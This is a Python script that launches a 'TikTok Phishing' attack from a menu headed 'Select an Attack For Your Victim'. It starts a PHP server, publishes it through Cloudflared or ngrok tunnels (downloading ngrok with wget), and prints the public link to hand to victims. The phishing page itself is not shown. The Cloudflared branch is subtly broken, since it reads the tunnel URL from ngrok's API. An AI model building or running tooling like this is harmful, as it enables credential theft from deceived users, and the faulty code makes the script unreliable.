import subprocess
import time
import os
import sys
import json
import requests

# Colors for output
RED = '\033[1;31m'
GREEN = '\033[1;32m'
BLUE = '\033[1;34m'
YELLOW = '\033[1;33m'
CYAN = '\033[1;36m'
NC = '\033[0m'  # No Color

def run_command(command, capture_output=False):
    result = subprocess.run(command, shell=True, text=True, capture_output=capture_output)
    if capture_output:
        return result.stdout.strip()
    return None

def start_cloudflared():
    # Start PHP server
    subprocess.Popen("php -S 127.0.0.1:8081", shell=True)
    time.sleep(1)  # Ensure server starts
    # Run Cloudflared in the background
    process = subprocess.Popen("cloudflared tunnel --url http://127.0.0.1:8081 --loglevel debug", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return process

def get_cloudflared_link():
    try:
        # Wait for Cloudflared to start
        time.sleep(10)
        response = requests.get("http://127.0.0.1:4040/api/tunnels")
        response.raise_for_status()  # Raise an error for bad HTTP status codes
        tunnels = response.json()
        tunnel_url = tunnels['tunnels'][0]['public_url']
        return tunnel_url
    except (requests.RequestException, KeyError, IndexError) as e:
        print(f"{RED}[-] Error retrieving Cloudflared link: {e}{NC}")
        return None

def print_ascii_art():
    art = """
    __        __  _                            _
    \ \      / / | |                           | |
     \ \    / /__| | ___ ___  _ __ ___   ___  | |_ ___
      \ \  / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \\
       \ \/ /  __/ | (_| (_) | | | | | |  __/ | || (_) |
        \__/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/
    """
    print(art)

def main():
    print_ascii_art()

    while True:
        print(f"{YELLOW}[::] Select an Attack For Your Victim [::]{NC}")
        print(f"{BLUE}[01] TikTok Phishing{NC}")
        print(f"{RED}[99] Exit{NC}")

        option = input("[-] Select an option: ").strip()

        if option == "01":
            print(f"{GREEN}[::] TikTok Phishing Selected [::]{NC}")
            print(f"{CYAN}[1] Cloudflared{NC}")
            print(f"{CYAN}[2] Ngrok{NC}")
            print(f"{CYAN}[3] Localhost{NC}")
            print(f"{CYAN}[9] Back to Main Menu{NC}")

            port_option = input("[-] Select a port forwarding service: ").strip()

            if port_option == "1":
                print(f"{GREEN}[-] Cloudflared Selected{NC}")
                process = start_cloudflared()
                time.sleep(5)  # Wait for Cloudflared to start
                tunnel_link = get_cloudflared_link()
                if tunnel_link:
                    print(f"{YELLOW}[*] Cloudflared Tunnel Link:{NC}")
                    print(f"{GREEN}[-] {tunnel_link}{NC}")
                else:
                    print(f"{RED}[-] Failed to retrieve Cloudflared link.{NC}")

                print(f"{CYAN}Press Enter to return to the main menu...{NC}")
                input()  # Wait for user input to return to the main menu

                # Terminate Cloudflared process if needed
                process.terminate()
                continue

            elif port_option == "2":
                print(f"{GREEN}[-] Ngrok Selected{NC}")
                if not os.path.isfile("ngrok"):
                    print(f"{YELLOW}[*] Downloading ngrok...{NC}")
                    run_command("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
                    run_command("unzip ngrok-stable-linux-arm.zip")
                    os.chmod("ngrok", 0o755)
                subprocess.Popen("php -S 127.0.0.1:8080", shell=True)
                subprocess.Popen("./ngrok http 8080", shell=True)
                time.sleep(5)
                print(f"{YELLOW}[*] Links:{NC}")
                local_link = "http://127.0.0.1:8080"
                ngrok_link = run_command("curl -s http://127.0.0.1:4040/api/tunnels", capture_output=True)
                print(f"{GREEN}[-] {local_link}{NC}")
                print(f"{GREEN}[-] {ngrok_link}{NC}")

            elif port_option == "3":
                print(f"{GREEN}[-] Localhost Selected{NC}")
                subprocess.Popen("php -S 127.0.0.1:8080", shell=True)
                time.sleep(2)
                print(f"{YELLOW}[*] Access the page locally at:{NC}")
                print(f"{GREEN}[-] http://127.0.0.1:8080{NC}")

            elif port_option == "9":
                continue

            else:
                print(f"{RED}[-] Invalid option, exiting.{NC}")

        elif option == "99":
            print(f"{RED}Exiting...{NC}")
            sys.exit(1)

        else:
            print(f"{RED}Invalid Option!{NC}")

if __name__ == "__main__":
    main()
